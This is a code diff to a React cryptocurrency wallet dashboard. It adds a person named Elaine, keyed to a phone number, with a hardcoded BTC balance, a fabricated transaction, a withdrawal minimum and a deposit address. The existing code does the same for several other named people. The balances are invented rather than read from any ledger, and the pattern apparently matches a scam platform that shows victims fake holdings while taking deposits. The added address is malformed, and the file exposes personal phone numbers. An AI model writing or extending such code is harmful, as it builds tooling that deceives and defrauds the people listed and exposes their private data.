@@ -64,15 +64,16 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const isLinda = userData.phone === "0061400252142";
   const isYuetwa = userData.phone === "447879474641";
   const isTommy = userData.phone === "12817101281";
+  const isElaine = userData.phone === "447753775653";
   
   // Dynamic balances for Jan based on BTC purchase state
   const janGbpBalance = hasExecutedBtcPurchase ? 0 : 2253751;
   const janBtcBalance = hasExecutedBtcPurchase ? 0.0138393646928217 : 0;
   
-  const cryptoBalance = isJoanne ? 2022715.98 : isJan ? (hasExecutedBtcPurchase ? janBtcBalance : janGbpBalance) : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : isLinda ? 2.73 : isYuetwa ? 0.63 : isTommy ? 1.0 : 44.62;
-  const cryptoSymbol = isJoanne ? "DASH" : isJan ? (hasExecutedBtcPurchase ? "BTC" : "GBP") : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : isLinda ? "BTC" : isYuetwa ? "BTC" : isTommy ? "BTC" : "BTC";
+  const cryptoBalance = isJoanne ? 2022715.98 : isJan ? (hasExecutedBtcPurchase ? janBtcBalance : janGbpBalance) : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : isLinda ? 2.73 : isYuetwa ? 0.63 : isTommy ? 1.0 : isElaine ? 0.5 : 44.62;
+  const cryptoSymbol = isJoanne ? "DASH" : isJan ? (hasExecutedBtcPurchase ? "BTC" : "GBP") : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : isLinda ? "BTC" : isYuetwa ? "BTC" : isTommy ? "BTC" : isElaine ? "BTC" : "BTC";
   const currentPrice = isJoanne ? dashPrice : isJan ? (hasExecutedBtcPurchase ? btcPrice : gbpToUsdRate) : (isJeremy || isBen) ? ethPrice : btcPrice;
-  const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : isBen ? 0.1 : isRami ? 0 : isLinda ? 0.1 : isTommy ? 0.1 : 45;
+  const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : isBen ? 0.1 : isRami ? 0 : isLinda ? 0.1 : isTommy ? 0.1 : isElaine ? 0.1 : 45;
   
   // USDT balances and Joanne's BTC balance
   const janUsdtBalance = isJan ? 0 : 0;
@@ -428,6 +429,17 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
     }
   ];
 
+  const elaineTransactions = [
+    { 
+      id: "1", 
+      type: "received", 
+      amount: 0.5, 
+      date: new Date().toISOString().split('T')[0], 
+      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+      hash: "bc1qelx..." 
+    }
+  ];
+
   const tommyTransactions = [
     { 
       id: "1", 
@@ -439,7 +451,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
     }
   ];
   
-  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : isRami ? ramiTransactions : isLinda ? lindaTransactions : isYuetwa ? yuetwaTransactions : isTommy ? tommyTransactions : dorothyTransactions;
+  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : isRami ? ramiTransactions : isLinda ? lindaTransactions : isYuetwa ? yuetwaTransactions : isTommy ? tommyTransactions : isElaine ? elaineTransactions : dorothyTransactions;
 
   const getBenAddress = (crypto: string) => {
     switch (crypto) {
@@ -476,6 +488,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                         isLinda ? "bc1q8pnedgwx0tgdwclgpa6zh0cgwrnmv4krv0xzcs" :
                         isYuetwa ? "bc1q2xtwa9hft3r5k8w7gh2jt6ufsnbaz3g4kmu8t" :
                         isTommy ? getTommyAddress(selectedCrypto) :
+                        isElaine ? "bc1qelaine9hft3r5k8w7gh2jt6ufsnbaz3g9km7t" :
                         "bc1qg7hxra3dw5usu38u84rcrz2le85s77uwkhe09a";
 
   const copyToClipboard = async (text: string) => {
